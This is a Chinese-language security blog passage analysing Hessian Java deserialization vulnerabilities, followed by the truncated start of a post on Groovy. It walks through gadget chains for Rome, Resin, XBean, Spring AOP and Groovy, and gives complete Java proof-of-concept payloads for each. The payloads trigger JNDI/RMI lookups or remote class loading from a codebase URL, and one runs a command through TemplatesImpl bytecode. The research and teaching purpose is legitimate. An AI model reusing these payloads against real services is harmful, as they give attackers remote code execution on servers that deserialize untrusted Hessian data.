来对自定义类型数据进行反序列化，关键方法在 readObject 处。\n<img src=\"/img/24-6-7/25.png\" >\ninstantiate 使用 unsafe 实例的 allocateInstance 直接创建类实例。\n<img src=\"/img/24-6-7/26.png\" >\n\n\n### 一些细节\n#### 协议版本\n在之前已经介绍过了，Hessian 传输协议已经由 1.0 版本迭代到了 2.0 版本。但是目前的 Hessian 包是两种协议都支持的，并且服务器使用哪种协议读取序列化数据，和返回哪种协议格式的序列化数据，将完全由请求中的标志位来进行定义。\n在我们测试使用的最新版中，这一设定位于 HessianProxyFactory 中的两个布尔型变量中，即 _isHessian2Reply 和 _isHessian2Request，如下图，默认情况下，客户端使用 Hessian 1.0 协议格式发送序列化数据，服务端使用 Hessian 2.0 协议格式返回序列化数据。\n<img src=\"/img/24-6-7/27.png\" >\n如果想自己指定用 Hessian 2.0 协议进行传输，可以使用如下代码进行设置：\n```java\nHessianProxyFactory factory  = new HessianProxyFactory();\nfactory.setHessian2Request(true);\n```\n#### Serializable\n在 Java 原生反序列化中，实现了 java.io.Serializable 接口的类才可以反序列化。Hessian 象征性的支持了这种规范，具体的逻辑如下图，在获取默认序列化器时，判断了类是否实现了 Serializable 接口。\n<img src=\"/img/24-6-7/28.png\" >\n但同时 Hessian 还提供了一个 _isAllowNonSerializable 变量用来打破这种规范，可以使用 SerializerFactory#setAllowNonSerializable 方法将其设置为 true，从而使未实现 Serializable 接口的类也可以序列化和反序列化。\n这就很魔幻了，判断是在序列化的过程中进行的，而非反序列化过程，那自然可以绕过了，换句话说，**Hessian 实际支持反序列化任意类，无需实现 Serializable 接口**。\n这里在提一下 serialVersionUID 的问题，在 Java 原生反序列化中，在未指定 serialVersionUID 的情况下如果修改过类中的方法和属性，将会导致反序列化过程中生成的 serialVersionUID 不一致导致的异常，但是 Hessian 并不关注这个字段，所以即使修改也无所谓。\n然后是 transient 和 static 的问题，在序列化时，由 UnsafeSerializer#introspect 方法来获取对象中的字段，在老版本中应该是 getFieldMap 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。\n<img src=\"/img/24-6-7/29.png\" >\n在原生流程中，标识为 transient 仅代表不希望 Java 序列化反序列化这个对象，开发人员可以在 writeObject/readObject 中使用自己的逻辑写入和恢复对象，但是 Hessian 中没有这种机制，因此标识为 transient 的字段在反序列化中一定没有值的。\n#### Object Naming\n之前在看代码时看到过，Hessian 在调用时还支持使用 id 和 ejbid 参数，可以导致调用不同的实体 Beans。\n这种情况当 Hessian 支持的调用服务是一些面向对象的服务比如 naming services/entity beans/session beans 或 EJB 容器时可以使用。\n本质上的调用流程都是一样的，只是提供服务的对象有所不同。\n相关内容可以查看官方连接：[http://hessian.caucho.com/...#ObjectNamingnon-normative](http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#ObjectNamingnon-normative)\n\n\n## Hessian反序列化漏洞\nHessian反序列化漏洞的关键出在HessianInput#readObject，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个byte总为M（ASCII为77）。下面我们跟进readObject()\n<img src=\"/img/24-6-7/30.png\" >\n继续跟进到ObjectInputStream#readMap。然后Object或者其他类型就是默认使用MapDeserializer\n跟进MapDeserializer#readMap \n<img src=\"/img/24-6-7/31.png\" >\nput会调用hashCode方法\n可以看到， Hessian 协议使用 unsafe 创建类实例，使用反射写入值，并且没有在重写了某些方法后对其进行调用这样的逻辑。\n所以无论是构造方法、getter/setter 方法、readObject 等等方法都不会在 Hessian 反序列化中被触发，那怎么会产生漏洞呢？\n答案就在 Hessian 对 Map 类型数据的处理上，在之前的分析中提到，MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。\n而众所周知， HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hasCode 方法，如下图。\n<img src=\"/img/24-6-7/32.png\" >\n而 TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。\n<img src=\"/img/24-6-7/33.png\" >\n也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：\n\n- kick-off chain 起始方法只能为 hashCode/equals/compareTo 方法；\n- 利用链中调用的成员变量不能为 transient 修饰；\n- 所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter/setter 的逻辑。\n\n这几个限制也导致了很多 Java 原生反序列化利用链在 Hessian 中无法使用，甚至 ysoserial 中一些明明是 hashCode/equals/compareTo 触发的链子都不能直接拿来用。\n\n目前常见的 Hessian 利用链在 marshalsec 中共有如下五个：\n\n- Rome\n- XBean\n- Resin\n- SpringPartiallyComparableAdvisorHolder\n- SpringAbstractBeanFactoryPointcutAdvisor\n\n\n### Rome链\n#### jndi\nRome 的链核心是 ToStringBean，这个类的 toString 方法会调用他封装类的全部无参 getter 方法，所以可以借助 JdbcRowSetImpl#getDatabaseMetaData() 方法触发 JNDI 注入。\n这也是Rome链的一种利用方式可以参考：[https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h](https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h)\n 之前打的是TemplateImpl字节码加载，这里照样可以打JdbcRowSetImpl的jdni\n**poc**\n```java\n\tpublic static Object JNDI() throws SQLException {\n\t\tString jndi=\"rmi://127.0.0.1:8085/WhVCFlBv\";\n\t\tJdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();\n\t\tjdbcRowSet.setDataSourceName(jndi);\n\t\tToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);\n\t\tEqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\thashMap.put(equalsBean,\"123\");\n\t\treturn hashMap;\n\t}\n```\n#### 二次反序列化\n上面 Gadget 因为是 JNDI 需要出网，所以通常被认为限制很高，因此还需要找无需出网的利用方式。其中一个常见的方式是使用 java.security.SignedObject 进行二次反序列化。\n<img src=\"/img/24-6-7/34.png\" >\nHessian反序列化触发到SignedObject的getObject方法，在这里再触发原生反序列化，这里反序列化可以再封装一次Rome链\n```java\npublic static Object TowUnSerialize() throws Exception {\n\t\tbyte[] code = CodeFactory.RuntimeExec(\"calc\");\n\t\tbyte[][] codes={code};\n\t\tTemplatesImpl templates=new TemplatesImpl();\n\t\tsetValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\t\tsetValue(templates,\"_name\",\"Yyjccc\");\n\t\tsetValue(templates,\"_bytecodes\",codes);\n\t\tsetValue(templates,\"_transletIndex\",0);\n\t\tToStringBean toStringBean=new ToStringBean(Templates.class,templates);\n\t\tEqualsBean equalsBean=new EqualsBean(String.class,\"aaa\");\n\t\tHashMap hashMap=new HashMap();\n\t\thashMap.put(equalsBean,\"aaa\");\n\t\tsetValue(equalsBean,\"_beanClass\",ToStringBean.class);\n\t\tsetValue(equalsBean,\"_obj\",toStringBean);\n\n\t\t//SignedObject\n\t\tKeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\");\n\t\tkpg.initialize(1024);\n\t\tKeyPair kp = kpg.generateKeyPair();\n\t\tSignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(\"DSA\"));\n\t\tToStringBean toStringBean_sign=new ToStringBean(SignedObject.class,signedObject);\n\t\tEqualsBean equalsBean_sign=new EqualsBean(String.class,\"yyjccc\");\n\t\tHashMap hashMap_sign=new HashMap();\n\t\thashMap_sign.put(equalsBean_sign,\"aaa\");\n\t\tsetValue(equalsBean_sign,\"_beanClass\",ToStringBean.class);\n\t\tsetValue(equalsBean_sign,\"_obj\",toStringBean_sign);\n\t\treturn hashMap_sign;\n\t}\n\n\n\tpublic static void main(String[] args) throws Exception {\n\t\tbyte[] serialize = HessianSerize.serialize(TowUnSerialize());\n\t\tObject deserialize = HessianSerize.deserialize(serialize);\n\t\tSystem.out.println();\n\t}\n```\n\n### Resin\nResin是一个轻量级的、高性能的开源Java应用服务器。它是由Caucho Technology开发的，旨在提供可靠的Web应用程序和服务的运行环境。和Tomcat一样是个服务器，它和hessian在一个group里，所以有一定的联系\n**依赖**\n```xml\n<dependency>\n    <groupId>com.caucho</groupId>\n    <artifactId>resin</artifactId>\n    <version>4.0.64</version>\n  </dependency>\n```\nResin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 com.sun.org.apache.xpath.internal.objects.XString 的 equals 方法。\n使用 XString 的 equals 方法触发 com.caucho.naming.QName 的 toSting 方法。\n**调用栈**\n```\nNamingManager.getObjectFactoryFromReference() (javax.naming.spi)\nNamingManager.getObjectInstance() (javax.naming.spi)\nNamingManager.getContext() (javax.naming.spi)\nContinuationContext.getTargetContext() (javax.naming.spi)\nContinuationContext.composeName() (javax.naming.spi)   // 关键点\nQName.toString() (com.caucho.naming)     // 关键点\nXString.equals() (com.sun.org.apache.xpath.internal.objects)\nHashMap.putVal()\nHashMap.put()\nMapDeserializer.readMap()\nSerializerFactory.readMap()\nHessian2Input.readObject()\n```\n\n<img src=\"/img/24-6-7/35.png\" >\nQName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。\n<img src=\"/img/24-6-7/36.png\" >\n这条利用链使用了 javax.naming.spi.ContinuationContext 类，其 composeName 方法调用 getTargetContext 方法，然后调用 NamingManager#getContext 方法传入其成员变量 CannotProceedException 的相关属性。\n\n<img src=\"/img/24-6-7/37.png\" >\n漏洞触发点在 NamingManager#getObjectInstance 方法，这个方法调用 VersionHelper 加载类并实例化。\n<img src=\"/img/24-6-7/38.png\" >\n加载时使用了 URLClassLoader 并指定了类名和 codebase。\n<img src=\"/img/24-6-7/39.png\" >\n这个逻辑就赋予了程序远程加载类的功能，也就是漏洞的最终利用点。\n回过头看看Reference对象是哪来的\n<img src=\"/img/24-6-7/40.png\" >\n<img src=\"/img/24-6-7/41.png\" >\n属性cpe\n进入了CannotProceedException的父类\n<img src=\"/img/24-6-7/42.png\" >\n因此控制cpe 的属性resolveObj为Reference对象，可以进行远程类加载\n\n**equal方法触发**\n还有一个问题，如何确保hashmap#put的时候会触发equals方法\n但是根据HashMap中putVal方法的了解，要想到达equals方法的调用处，需要满足前面的几个if条件：\n\n- (p = tab[i = (n - 1) & hash]) == null\n- p.hash == hash\n\n其实这两个条件表达的意思一致，就是put进去的两个元素的hashcode要一致，这样才有资格到达equals方法处，第一个元素QName对象是需要利用的对象，固定不动，而XString是为了触发equals方法而构造的对象，对链的后半部分无影响，因此可以根据QName的hash来构造XString对象\n\n- 目标hash：QName中有hashCode方法，直接调用即可得到目标hash\n- 如何构造能够影响XString的hash\n\n查看其hashCode方法\n<img src=\"/img/24-6-7/43.png\" >\n<img src=\"/img/24-6-7/44.png\" >\n即将m_obj属性转换成字符串类型返回，最后调用String的hashCode方法进行hash计算，这里的m_obj即是实例化XString传入的参数\n现在的关键点在于根据String类的hashCode逻辑，得到该方法的逆操作，即根据hash值得到对应的string，然后将其作为m_obj\n\n看看String 的HashCode\n<img src=\"/img/24-6-7/45.png\" >\n在逆向的时候需要考虑int类型溢出的问题\n这里暂时不研究怎么逆向算等值HashCode的字符串\n\n\n当然另外一种方法就是有SpringAOP依赖，**使用HotSwappableTargetSource包装一下，就不用逆向算hashCode了**\n直接copy网上代码：\n```java\npublic static String unhash ( int hash ) {\n\t\tint target = hash;\n\t\tStringBuilder answer = new StringBuilder();\n\t\tif ( target < 0 ) {\n\t\t\t// String with hash of Integer.MIN_VALUE, 0x80000000\n\t\t\tanswer.append(\"\\\\u0915\\\\u0009\\\\u001e\\\\u000c\\\\u0002\");\n\n\t\t\tif ( target == Integer.MIN_VALUE )\n\t\t\t\treturn answer.toString();\n\t\t\t// Find target without sign bit set\n\t\t\ttarget = target & Integer.MAX_VALUE;\n\t\t}\n\n\t\tunhash0(answer, target);\n\t\treturn answer.toString();\n\t}\n\tprivate static void unhash0 ( StringBuilder partial, int target ) {\n\t\tint div = target / 31;\n\t\tint rem = target % 31;\n\n\t\tif ( div <= Character.MAX_VALUE ) {\n\t\t\tif ( div != 0 )\n\t\t\t\tpartial.append((char) div);\n\t\t\tpartial.append((char) rem);\n\t\t}\n\t\telse {\n\t\t\tunhash0(partial, div);\n\t\t\tpartial.append((char) rem);\n\t\t}\n\t}\n```\n注意：放入的字符串最好不要看起来对称（看似无规律）\n**poc**\n```java\npublic static Object payload() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {\n\t\tString codebase=\"http://127.0.0.1:8085/\";\n\t\tString clazzName=\"HVzHJCkI\";\n\t\tReference ref = new Reference(clazzName,clazzName,codebase);\n\n\t\tCannotProceedException cpe = new CannotProceedException();\n\t\tClass<?> aClass = Class.forName(\"javax.naming.spi.ContinuationContext\");\n\t\tConstructor<?> declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);\n\t\tdeclaredConstructor.setAccessible(true);\n\t\tContext context = (Context) declaredConstructor.newInstance(cpe, new Hashtable<>());\n\t\tQName qName = new QName(context,\"abc\",\"edf\");\n\t\tXString x1 =new XString(unhash(qName.hashCode()));\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\thashMap.put(qName,\"aaa\");\n\t\thashMap.put(x1,\"bbb\");\n\t\tReflect.setValue(NamingException.class,cpe,\"resolvedObj\",ref);\n\t\treturn hashMap;\n\t}\n\n\tpublic static String unhash ( int hash ) {\n\t\tint target = hash;\n\t\tStringBuilder answer = new StringBuilder();\n\t\tif ( target < 0 ) {\n\t\t\t// String with hash of Integer.MIN_VALUE, 0x80000000\n\t\t\tanswer.append(\"\\\\u0915\\\\u0009\\\\u001e\\\\u000c\\\\u0002\");\n\n\t\t\tif ( target == Integer.MIN_VALUE )\n\t\t\t\treturn answer.toString();\n\t\t\t// Find target without sign bit set\n\t\t\ttarget = target & Integer.MAX_VALUE;\n\t\t}\n\n\t\tunhash0(answer, target);\n\t\treturn answer.toString();\n\t}\n\tprivate static void unhash0 ( StringBuilder partial, int target ) {\n\t\tint div = target / 31;\n\t\tint rem = target % 31;\n\n\t\tif ( div <= Character.MAX_VALUE ) {\n\t\t\tif ( div != 0 )\n\t\t\t\tpartial.append((char) div);\n\t\t\tpartial.append((char) rem);\n\t\t}\n\t\telse {\n\t\t\tunhash0(partial, div);\n\t\t\tpartial.append((char) rem);\n\t\t}\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n\t\tbyte[] serialize = HessianSerize.serialize2(payload());\n\t\tHessianSerize.deserialize(serialize);\n\t}\n```\n<img src=\"/img/24-6-7/46.png\" >\n\n\n### XBean\nXBean是Apache Geronimo的子项目，设计这个的目的是为了能为Geronimo的插件提供一种方便 \n快捷的配置方式（具体怎么方便快捷，看完全文便知）。后来，Xbean被更多的开源项目引用。例如：jetty、Activemq等等，同时xbean也提供了对spring的支持\n**依赖**\n```xml\n<dependency>\n  <groupId>org.apache.xbean</groupId>\n  <artifactId>xbean-naming</artifactId>\n  <version>4.24</version>\n</dependency>\n```\n**调用栈**\n```\nNamingManager.getObjectFactoryFromReference() (javax.naming.spi)\nNamingManager.getObjectInstance() (javax.naming.spi)\nContextUtil.resolve()   (org.apache.xbean.naming.context)// 关键点\nContextUtil$ReadOnlyBinding.getObject() (org.apache.xbean.naming.context)// 关键点\nBinding.toString() (com.caucho.naming)     // 关键点\nXString.equals() (com.sun.org.apache.xpath.internal.objects)\nHotSwappableTargetSource.equals()\nHashMap.putVal()\nHashMap.put()\nMapDeserializer.readMap()\nSerializerFactory.readMap()\nHessian2Input.readObject()\n```\nXBean 这条链几乎是与 Resin 一模一样，只不过是在 XBean 中找到了类似功能的实现。\n首先还是用 XString 触发 ContextUtil.ReadOnlyBinding 的 toString 方法（实际继承 javax.naming.Binding），toString 方法调用 getObject 方法获取对象。\n<img src=\"/img/24-6-7/47.png\" >\n\n调用 ContextUtil#resolve 方法。\n<img src=\"/img/24-6-7/48.png\" >\n方法调用 NamingManager#getObjectInstance 方法，后续触发逻辑一致，从远程加载恶意类字节码。\n<img src=\"/img/24-6-7/49.png\" >\n这里触发equals用HotSwappableTargetSource包装一下，也可以用上面的unhash方法\npoc\n```java\npublic static Object payload() throws NoSuchFieldException, IllegalAccessException, NamingException {\n\t\tString addr=\"http://127.0.0.1:8085/\";\n\t\tString className=\"HVzHJCkI\";\n\t\tReference ref = new Reference(className, className, addr);\n\t\tContextUtil.ReadOnlyBinding readOnlyBinding = new ContextUtil.ReadOnlyBinding(\"yyjccc\",\"aaa\", new WritableContext());\n\t\tXString x1=new XString(\"abc\");\n\t\tHotSwappableTargetSource h1 = new HotSwappableTargetSource(readOnlyBinding);\n\t\tHotSwappableTargetSource h2=new HotSwappableTargetSource(x1);\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\thashMap.put(h1,\"yyj\");\n\t\thashMap.put(h2,\"ccc\");\n\t\tReflect.setValue(readOnlyBinding,\"value\",ref);\n\t\treturn hashMap;\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n\t\tbyte[] serialize = HessianSerize.serialize2(payload());\n\t\tHessianSerize.deserialize(serialize);\n\t}\n```\n### Spring AOP\n这条利用链也很简单，还是利用 HashMap 中put方法，若hashmap不为空，就会对比触发 equals 方法。\n<img src=\"/img/24-6-7/50.png\" >\n核心是 AbstractPointcutAdvisor 和其子类 AbstractBeanFactoryPointcutAdvisor。\n使用两个子类，都可以\n<img src=\"/img/24-6-7/51.png\" >\n触发点在 AbstractPointcutAdvisor 的 equals 方法，对比两个 AbstractPointcutAdvisor 是否相同，就是在对比其 Pointcut 切点和 Advice 是否为同一个。\n<img src=\"/img/24-6-7/52.png\" >\n其子类 AbstractBeanFactoryPointcutAdvisor 是和 BeanFactory 有关的 PointcutAdvisor，简单来说就是进行切片时可以使用 beanFactory 里面注册的实例。其 getAdvice 方法会调用其成员变量 beanFactory 的 getBean 方法获取 Bean 实例。\n<img src=\"/img/24-6-7/53.png\" >\n这时只要结合 SimpleJndiBeanFactory 就可以触发 JNDI 查询。\n<img src=\"/img/24-6-7/54.png\" >\n进入JndiTemplate#lookup中 \n<img src=\"/img/24-6-7/55.png\" >\n这里说明能够成功的进行jndi注入\n在自己写这条链的时候，也是在不断的报错，因为发现它里面利用的很多类都没有继承Serializable接口，导致无法序列化和反序列化，并且似乎并没有找到绕过去的方式，包括SimpleJndiBeanFactory，后来才知道Hessian可以不需要继承序列化和反序列化的。\n```java\n  public static String serialize2(Object object) throws IOException {\n        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();\n        HessianOutput hessianOutput=new HessianOutput(byteArrayOutputStream);\n        SerializerFactory serializerFactory=new SerializerFactory(); //无需继承Serializable也可进行序列化和反序列化\n        serializerFactory.setAllowNonSerializable(true);\n        hessianOutput.setSerializerFactory(serializerFactory);\n        hessianOutput.writeObject(object);\n        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());\n    }\n```\n**poc**\n```java\npublic static Object SpringAop() throws NoSuchFieldException, IllegalAccessException {\n\t\tString jndi=\"rmi://127.0.0.1:8085/WhVCFlBv\";\n\t\tSimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();\n\t\tsimpleJndiBeanFactory.setShareableResources(jndi);\n\t\tDefaultBeanFactoryPointcutAdvisor defaultAdvisor = new DefaultBeanFactoryPointcutAdvisor();\n\t\tdefaultAdvisor.setAdviceBeanName(jndi);\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\tReflect.setValue(AbstractBeanFactoryPointcutAdvisor.class,defaultAdvisor,\"beanFactory\",new SimpleJndiBeanFactory());\n\t\thashMap.put(new DefaultBeanFactoryPointcutAdvisor(),defaultAdvisor);\n\t\thashMap.put(defaultAdvisor,defaultAdvisor);\n\t\tReflect.setValue(AbstractBeanFactoryPointcutAdvisor.class,defaultAdvisor,\"beanFactory\",simpleJndiBeanFactory);\n\t\treturn hashMap;\n\t}\npublic static void main(String[] args) throws Exception {\n\t\tbyte[] serialize = HessianSerize.serialize2(SpringAop());\n\t\tObject deserialize = HessianSerize.deserialize(serialize);\n\t}\n```\n### Spring Context & AOP\n这条链的触发点在于 AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder 的 toString 方法，会打印 order 属性，调用 advisor 的 getOrder 方法。\n\n这个感觉就是上条链子差不多的思路\n<img src=\"/img/24-6-7/56.png\" >\n这里需要String方法，参考[https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h](https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h)\n中的Xstring;XString的equal方法就会触发toString方法\n\n此时就需要找到类同时实现了 Advisor 和 Ordered 接口，于是找到了 AspectJPointcutAdvisor ，这个类的 getOrder 方法调用 AbstractAspectJAdvice 的 getOrder 方法。\n<img src=\"/img/24-6-7/57.png\" >\n又调用了 AspectInstanceFactory 的 getOrder 方法。\n<img src=\"/img/24-6-7/58.png\" >\n继续找 AspectInstanceFactory 的子类看有没有可以触发的点，找到了 BeanFactoryAspectInstanceFactory，其 getOrder 方法调用 beanFactory 的 getType 方法。\n<img src=\"/img/24-6-7/59.png\" >\n于是又掏出 SimpleJndiBeanFactory ，\n\n<img src=\"/img/24-6-7/60.png\" >\n他的的 doGetType 方法调用 doGetSingleton 方法执行 JNDI 查询，组成了完整的利用链。\n<img src=\"/img/24-6-7/61.png\" >\n在 marshalsec 封装对象时，使用了 HotSwappableTargetSource 封装类，其 equals 方法会调用其 target 的 equals 方法。\n其实并无必要，感觉是纯炫技写法。\n**poc**\n```java\npublic static Object AOPContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException {\n\t\tString jndiUrl = \"rmi://127.0.0.1:8085/WhVCFlBv\";\n\t\tSimpleJndiBeanFactory simpleJndiBeanFactory=new SimpleJndiBeanFactory();\n\t\tsimpleJndiBeanFactory.setShareableResources(jndiUrl);\n\t\tAspectInstanceFactory beanFactoryAspectInstanceFactory=new BeanFactoryAspectInstanceFactory(simpleJndiBeanFactory,jndiUrl);\n\t\tAbstractAspectJAdvice advice = (AspectJAfterAdvice.class).newInstance();\n\t\tReflect.setValue(org.springframework.aop.aspectj.AbstractAspectJAdvice.class,advice,\"aspectInstanceFactory\",beanFactoryAspectInstanceFactory);\n\t\tAspectJPointcutAdvisor aspectJPointcutAdvisor=(AspectJPointcutAdvisor.class).newInstance();\n\t\tReflect.setValue(aspectJPointcutAdvisor,\"advice\",advice);\n\t\tObject Partially=Class.forName(\"org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder\").newInstance();\n\t\tReflect.setValue(Partially,\"advisor\",aspectJPointcutAdvisor);\n\t\tHotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(new XString(\"1\"));\n\t\tHotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(new XString(\"a\"));\n\t\tHashMap hashMap = new HashMap();\n\t\thashMap.put(hotSwappableTargetSource, \"1\");\n\t\thashMap.put(hotSwappableTargetSource1, \"2\");\n\t\tReflect.setValue(hotSwappableTargetSource,\"target\",Partially);\n\t\treturn hashMap;\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n\t\tbyte[] serialize = HessianSerize.serialize2(AOPContext());\n\t\tObject deserialize = HessianSerize.deserialize(serialize);\n\t}\n\n```\n### Groovy\n参考：[Groovy](https://www.yuque.com/yyjccc/pk74ko/yl25n3uhcmu83smp?view=doc_embed)\n触发点使用了 TreeMap 触发 compareTo 方法，使用 ConvertedClosure 生成动态代理对象，将方法调用转移至 MethodClosure 封装类，借用其 doCall 方法进一步调用 ContinuationDirContext#listBindings 方法触发后续的攻击流程。\n<img src=\"/img/24-6-7/62.png\" >\n直接TreeMap#put会报错\n解决报错\n<img src=\"/img/24-6-7/63.png\" >\n就不能直接使用TreeMap#put了\n看看put方法是干了什么\n<img src=\"/img/24-6-7/64.png\" >\n跳过前面的代码，避免调用compare\n其实就是创建了TreeMap.Entry，然后挂入父节点\n已知TreeMap是二叉树，放入两个节点（两次put操作）\n放入第二个节点时候就会比较key，进行排序，那我们序列化的时候就直接排序好\n根节点就是普通数据，右节点放入要触发的对象\n<img src=\"/img/24-6-7/65.png\" >\n第三个参数是父节点（root节点，父节点为null）\n放入根节点\n```java\nTreeMap treeMap = new TreeMap<>();\nClass<?> e = Class.forName(\"java.util.TreeMap$Entry\");\n\t\tConstructor<?> declaredConstructor = e.getDeclaredConstructor(Object.class, Object.class, e);\n\t\tdeclaredConstructor.setAccessible(true);\n\t\tObject commonEntry = declaredConstructor.newInstance(\"a\", 1, null);\nReflect.setValue(treeMap,\"root\",commonEntry);\n\n```\n放入第二个节点\n```java\nObject proxyMapEntry = declaredConstructor.newInstance(proxyMap, 2, commonEntry);\n\t\tReflect.setValue(treeMap,\"size\",2);\n\t\tReflect.setValue(treeMap,\"modCount\",2);\n```\n\n**poc**\n```java\npackage com.yyjcccc.hessianser.gadget;\n\nimport com.yyjccc.exploit.util.Reflect;\nimport com.yyjcccc.hessianser.usage.HessianSerize;\nimport org.codehaus.groovy.runtime.ConvertedClosure;\nimport org.codehaus.groovy.runtime.MethodClosure;\n\nimport javax.naming.CannotProceedException;\nimport javax.naming.Context;\nimport javax.naming.NamingException;\nimport javax.naming.Reference;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Proxy;\nimport java.util.Hashtable;\nimport java.util.TreeMap;\n\npublic class GroovyGadget {\n\n\tpublic static Object payload() throws Exception{\n\t\tString addr=\"http://127.0.0.1:8085/\";\n\t\tString className=\"HVzHJCkI\";\n\t\tReference ref=new Reference(className,className,addr);\n\n\t\tCannotProceedException cpe = new CannotProceedException();\n\t\tReflect.setValue(NamingException.class,cpe,\"resolvedObj\",ref);\n\t\tClass<?> aClass = Class.forName(\"javax.naming.spi.ContinuationContext\");\n\n\t\tConstructor<?> constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);\n\t\tconstructor.setAccessible(true);\n\t\tContext context = (Context) constructor.newInstance(cpe, new Hashtable<>());\n\n\t\tMethodClosure methodClosure = new MethodClosure(context,\"listBindings\");\n\t\tConvertedClosure closure=new ConvertedClosure(methodClosure,\"compareTo\");\n\t\t// 创建 ConvertedClosure 的动态代理类实例\n\t\tComparable proxyMap = (Comparable) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),\n\t\t\t\tnew Class[]{Comparable.class}, closure);\n\t\tTreeMap treeMap = new TreeMap<>();\n\t\tClass<?> e = Class.forName(\"java.util.TreeMap$Entry\");\n\t\tConstructor<?> declaredConstructor = e.getDeclaredConstructor(Object.class, Object.class, e);\n\t\tdeclaredConstructor.setAccessible(true);\n\t\tObject commonEntry = declaredConstructor.newInstance(\"a\", 1, null);\n\t\tReflect.setValue(treeMap,\"root\",commonEntry);\n\n\t\t//第三个参数为父节点\n\t\tObject proxyMapEntry = declaredConstructor.newInstance(proxyMap, 2, commonEntry);\n\t\tReflect.setValue(treeMap,\"size\",2);\n\t\tReflect.setValue(treeMap,\"modCount\",2);\n\n\n\t\tReflect.setValue(commonEntry,\"right\",proxyMapEntry);\n\t\treturn treeMap;\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n\t\tbyte[] serialize = HessianSerize.serialize2(payload());\n\t\tHessianSerize.deserialize(serialize);\n\t}\n}\n\n```\n\n\n\n## Reference\n\n- [http://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](http://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)\n- [https://goodapple.top/archives/1193](https://goodapple.top/archives/1193)\n- [https://su18.org/post/hessian/](https://su18.org/post/hessian/)\n- [https://xz.aliyun.com/t/13345](https://xz.aliyun.com/t/13345)\n- [https://www.cnblogs.com/F12-blog/p/18156091](https://www.cnblogs.com/F12-blog/p/18156091)\n- [https://xz.aliyun.com/t/13599](https://xz.aliyun.com/t/13599)\n","tags":["java安全","反序列化漏洞","Hessian"],"categories":["java安全"]},{"title":"Groovy","url":"/2024/06/06/Groovy/","content":"\n\n\n\n# Groovy\n\n\nGroovy 是一种基于 JVM 的开发语言，具有类似于 Python，Ruby，Perl 和 Smalltalk 的功能。Groovy 既可以用作 Java 平台的编程语言，也可以用作脚本语言。groovy 编译之后生成 .class 文件，与 Java 编译生成的无异，因此可以在 JVM 上运行。\n\n## 前置知识\n### MethodClosure\norg.codehaus.groovy.runtime.MethodClosure 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。\nMethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。\n<img src=\"/img/24-6-6/1.png\" >\nMethodClosure 中有一个 doCall 方法，调用 InvokerHelper.invokeMethod() 方法进行方法调用\n<img src=\"/img/24-6-6/2.png\" >\n这样就可以执行系统命令\n```java\n\tMethodClosure mc = new MethodClosure(Runtime.getRuntime(), \"exec\");\n\t\tMethod m  = MethodClosure.class.getDeclaredMethod(\"doCall\", Object.class);\n\t\tm.setAccessible(true);\n\t\tm.invoke(mc, \"calc\");\n```\n### String.execute() 方法\nGroovy 为 String 类型添加了 execute() 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 \"ls\".execute() 这种方法来执行系统命令 “ls”。\n编写groovy\n```groovy\npackage com.yyjccc.groovy\n\nclass Execute {\n    static void main(String[] args) {\n        